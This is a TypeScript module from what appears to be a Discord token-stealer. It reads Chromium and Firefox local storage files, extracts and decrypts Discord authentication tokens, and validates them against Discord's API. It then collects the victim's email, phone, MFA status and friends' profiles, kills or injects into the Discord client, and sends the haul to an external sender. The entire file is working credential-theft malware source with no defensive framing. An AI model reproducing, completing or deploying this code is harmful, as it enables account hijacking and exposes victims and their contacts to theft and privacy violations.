import axios from 'axios';
import fs from 'fs';
import path from 'path';
import { PATHS } from '../config/constants';
import { getEncryptionKey, decryptToken } from '../core/crypto';
import { findLevelDBPaths } from '../utils/file';
import { TokenValidation } from '../types';
import { sendDiscordToken } from '../api/sender';
import { dckill } from './injection';
import { firefoxSteal } from '../browsers/firefox';

export async function safeStorageSteal(browserPath: string, platform: string): Promise<Array<[string, string]>> {
    const tokens: Array<[string, string]> = [];
    const key = await getEncryptionKey(browserPath);

    if (!key) {
        return tokens;
    }

    const leveldbPaths = findLevelDBPaths(browserPath);

    for (const leveldbPath of leveldbPaths) {
        try {
            const files = fs.readdirSync(leveldbPath);

            for (const fileName of files) {
                if (!fileName.endsWith('.log') && !fileName.endsWith('.ldb')) {
                    continue;
                }

                const filePath = path.join(leveldbPath, fileName);

                try {
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    const lines = fileContent.split('\n');

                    for (const line of lines) {
                        if (line.trim()) {
                            const matches = line.match(/dQw4w9WgXcQ:[^"\s]+/g);
                            if (matches) {
                                for (let match of matches) {
                                    match = match.replace(/\\$/, '');
                                    const decrypted = decryptToken(match, key);
                                    if (decrypted && !tokens.some(t => t[0] === decrypted && t[1] === platform)) {
                                        tokens.push([decrypted, platform]);
                                    }
                                }
                            }
                        }
                    }
                } catch (e) {
                }
            }
        } catch (error) {
        }
    }

    return tokens;
}

export function simpleSteal(browserPath: string, platform: string): Array<[string, string]> {
    const tokens: Array<[string, string]> = [];
    const leveldbPaths = findLevelDBPaths(browserPath);

    for (const leveldbPath of leveldbPaths) {
        try {
            const files = fs.readdirSync(leveldbPath);

            for (const fileName of files) {
                if (!fileName.endsWith('.log') && !fileName.endsWith('.ldb')) {
                    continue;
                }

                const filePath = path.join(leveldbPath, fileName);

                try {
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    const lines = fileContent.split('\n');

                    for (const line of lines) {
                        if (line.trim()) {
                            const matches = line.match(/[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g);
                            if (matches) {
                                for (const match of matches) {
                                    if (!tokens.some(t => t[0] === match && t[1] === platform)) {
                                        tokens.push([match, platform]);
                                    }
                                }
                            }
                        }
                    }
                } catch (e) {
                }
            }
        } catch (error) {
        }
    }

    return tokens;
}

export async function getTokens(platform: string, browserPath: string): Promise<Array<[string, string]>> {
    let tokens: Array<[string, string]> = [];
    tokens = await safeStorageSteal(browserPath, platform);
    if (platform === 'Firefox') {
        tokens = await firefoxSteal(browserPath, platform);
    } else if (tokens.length === 0) {
        tokens = await simpleSteal(browserPath, platform);
    }


    return tokens;
}

export async function getFriends(token: string): Promise<any[]> {
    try {
        const cleanedToken = token.trim();
        const response = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
            headers: {
                'Authorization': cleanedToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Referer': 'https://discord.com/channels/@me',
                'Accept': '*/*'
            },
            timeout: 10000
        });

        if (response.data && Array.isArray(response.data)) {
            return response.data.filter((rel: any) => rel.type === 1);
        }
        return [];
    } catch (e: any) {
        return [];
    }
}

export async function getFriendProfiles(token: string): Promise<any[]> {
    try {
        const cleanedToken = token.trim();
        const relationships = await getFriends(cleanedToken);
        const profiles: any[] = [];

        for (const rel of relationships) {
            if (!rel || !rel.id) continue;

            try {
                const response = await axios.get(`https://discord.com/api/v9/users/${rel.id}/profile`, {
                    headers: {
                        'Authorization': cleanedToken,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                        'Referer': 'https://discord.com/channels/@me',
                        'Accept': '*/*'
                    },
                    timeout: 10000
                });

                if (!response.data) {
                    profiles.push({ relationship: rel, profile: null });
                    continue;
                }
                profiles.push({ relationship: rel, profile: response.data });
            } catch (e) {
                profiles.push({ relationship: rel, profile: null });
            }
        }

        return profiles;
    } catch (e) {
        return [];
    }
}

export async function validateToken(token: string): Promise<TokenValidation> {
    try {
        const cleanedToken = token.trim();
        if (cleanedToken.length < 50) {
            return { valid: false, reason: 'Invalid token format' };
        }

        const response = await axios.get('https://discord.com/api/v9/users/@me', {
            headers: {
                'Authorization': cleanedToken,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Referer': 'https://discord.com/channels/@me',
                'Accept': '*/*'
            },
            timeout: 10000
        });

        const userData = response.data;
        if (userData && userData.id && userData.username) {
            const userRes = await axios.get(`https://discord.com/api/v9/users/${userData.id}/profile`, {
                headers: {
                    'Authorization': cleanedToken,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                    'Referer': 'https://discord.com/channels/@me',
                    'Accept': '*/*'
                },
                timeout: 10000
            });
            const friends = await getFriendProfiles(cleanedToken);
            return { valid: true, userInfo: { ...userRes.data, email: userData.email, phone: userData.phone, mfa_enabled: userData.mfa_enabled }, friends };
        }
        return { valid: false, reason: 'Invalid user data' };
    } catch (e: any) {
        return {
            valid: false,
            reason: e.response ? `HTTP ${e.response.status}` : e.message
        };
    }
}

export async function collectValidDiscordTokens(): Promise<Array<[string, string, TokenValidation]>> {
    const allTokens: Array<[string, string, TokenValidation]> = [];

    for (const [name, base] of Object.entries(PATHS)) {
        if (!fs.existsSync(base as string)) continue;

        const tokens =await  getTokens(name, base as string);
        for (const [token, platform] of tokens) {
            if (allTokens.some(t => t[0] === token)) continue;

            try {
                const validation = await validateToken(token);
                if (validation && validation.valid) {
                    allTokens.push([token, platform, validation]);
                }
            } catch (err: unknown) {
                const error = err as Error;
            }
        }
    }

    return allTokens;
}

export async function stealTokens(): Promise<void> {
    await dckill();

    const tokens = await collectValidDiscordTokens();

    for (const [token, platform, validation] of tokens) {
        try {
            await sendDiscordToken(token, validation.userInfo, validation.friends);
        } catch (error: unknown) {
            const err = error as Error;
        }
    }
}
